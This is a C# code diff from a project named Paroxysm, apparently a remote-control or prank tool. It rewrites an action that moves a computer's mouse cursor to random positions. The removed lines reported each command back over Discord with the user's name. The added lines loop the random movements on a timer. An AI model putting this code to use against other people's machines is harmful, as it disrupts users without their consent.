@@ -1,21 +1,21 @@
-﻿using Discord;
-using Paroxysm.Discord;
+﻿using System.ComponentModel;
+using Paroxysm.Tools;
 
 namespace Paroxysm.Hooks.Actions;
 
 public static class MoveCursorAction
 {
-    public static Embed Follow()
+    public static void Follow(object? sender, DoWorkEventArgs doWorkEventArgs)
     {
-        Random random = new();
+        while (Settings.CursorRandom)
+        {
+            Random random = new();
+            var randomX = random.Next(-1000, 1000);
+            var randomY = random.Next(-1000, 1000);
 
-        var randomX = random.Next(-1000, 1000);
-        var randomY = random.Next(-1000, 1000);
-
-        HookStatement.SetCursorPos(randomX, randomY);
-
-        return DiscordEmbed.CreateWithText(Color.Red, "Command was successfully executed.",
-            "Mouse cursor has been moved", Environment.UserName,
-            null);
+            Thread.Sleep(random.Next(Settings.CursorMinTime, Settings.CursorMaxTime));
+            Task.Run(() => HookStatement.SetCursorPos(randomX, randomY));
+            Console.WriteLine($"\t[CURRENT SESSION LOG] Cursor moved to X: {randomX} Y: {randomY}");
+        }
     }
 }
